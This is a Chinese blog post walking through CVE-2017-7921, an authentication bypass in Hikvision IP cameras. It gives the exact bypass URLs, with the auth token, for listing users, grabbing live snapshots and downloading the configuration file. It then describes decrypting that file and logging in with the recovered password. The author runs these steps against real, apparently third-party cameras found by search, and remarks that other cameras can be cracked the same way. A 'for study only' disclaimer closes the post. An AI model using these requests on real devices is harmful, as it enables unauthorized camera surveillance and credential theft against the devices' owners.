# CVE-2017-7921 海康威视（Hikvision）摄像头漏洞复现 - Gyier - 博客园

> 原文：[`www.cnblogs.com/yier-G/p/16632842.html`](https://www.cnblogs.com/yier-G/p/16632842.html)

今天看到了海康威视又出了新漏洞——CVE-2021-36260，突然心血来潮想要复现一下，结果搜到了一个旧的漏洞——CVE-2017-7921，而且发现仍然有不少海康威视摄像头后台没有修补这个漏洞，于是就来记录一下复现过程。

目录

*   1.特定页面搜索
*   2.验证漏洞
*   3.漏洞验证

    *   3.1 检索用户与用户列表
    *   3.2 获取监控快照
    *   3.3 下载摄像头配置账号密码文件
    *   3.4 配置文件解码
    *   3.5 登录验证 

# 1.特定页面搜索

 先搜索海康威视的摄像头后台，页面内容包含 Hikvison 就能搜到，还是很容易的。至于具体方法相信安全人员都有自己的手段，就不细讲了。

# 2.验证漏洞

 浏览过几个后台就发现，旧设备和新设备的后台页面有很大区别，而旧设备的后台页面仍有不少都没修这个漏洞。
新设备页面
![](img/dceacd4783b4d5aded482ac965fe53ce.png)
旧设备页面
![](img/5c04fe36d4ff0932e6752d853137d6e5.png)
接下来就好说了，随便找个旧设备页面验证漏洞就行了。

# 3.漏洞验证

 ## 3.1 检索用户与用户列表

 在 web 浏览器中输入以下代码来检索用户与用户列表

`http://目的 IP 地址/Security/users?auth=YWRtaW46MTEK`
浏览器输入结果如下图所示

```
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<UserList  version="1.0">
<User  version="1.0">
<id>1</id>
<userName>admin</userName>
<priority>high</priority>
<ipAddress>0.0.0.0</ipAddress>
<macAddress>00:00:00:00:00:00</macAddress>
<userLevel>Administrator</userLevel>
</User>
</UserList> 
```

我们可以知道这个摄像头有且只有一个用户名 admin

## 3.2 获取监控快照

 在没有进行身份验证的情况下获取监控快照可以使用以下代码在浏览器中打开
`http://目的 IP 地址/onvif-http/snapshot?auth=YWRtaW46MTEK`
浏览器返回结果如下（马赛克自保）
![](img/5793ab8308e2ee81a838445b0399e694.png)

## 3.3 下载摄像头配置账号密码文件

 在没有验证的情况下需要使用如下代码来下载摄像头的配置文件
`http://目的 IP 地址/System/configurationFile?auth=YWRtaW46MTEK`
代码输入之后浏览器会自动下载一个名为 configurationFile 的文件，如下
![](img/6fdac810a0437b0195d14095daaf35f0.png)
现在我们已近获取到了摄像头的配置文件

## 3.4 配置文件解码

 在上面我们已近得到了海康威视摄像头的配置文件了，但是配置文件是加密过的，我们没有办法从中直接得到密码。所以我们需要先将配置文件进行解密，这里我们需要用到一个专门的海康威视配置文件解密工具
楼主找了半天，发现 CSDN 上有但要积分，github 上有但需要特殊的代码环境，解码后还要二进制打开。一番寻找下终于找到了一个大佬用 Python 写的脚本可以直接看到密码。
大佬博客链接如下：
https://blog.csdn.net/qq_41617034/article/details/117521734
如图（马赛克自保）
![](img/f775b02a0b7d930ae7bc9d878fed4550.png)
可以看到密码是出厂默认密码 12345，事实上有许多后台都是出厂密码。

## 3.5 登录验证

 输入用户名密码，登录成功，说明破解是成功的，其他的摄像头也可以依次按照此方式破解。
![](img/6c9ba1ed27d991b4d5582d6ff5032f24.png)

跟着复现流程的大佬博客链接
https://zhuanlan.zhihu.com/p/383242333

作为入门的安全小白，一个下午就可以熟悉复现流程，而且漏洞遍地都是，网上复现教程也很详细很多，经过这次复现，感慨中国加强网络安全的重要性。
此漏洞复现仅供学习使用，请勿用于不法用途！！！！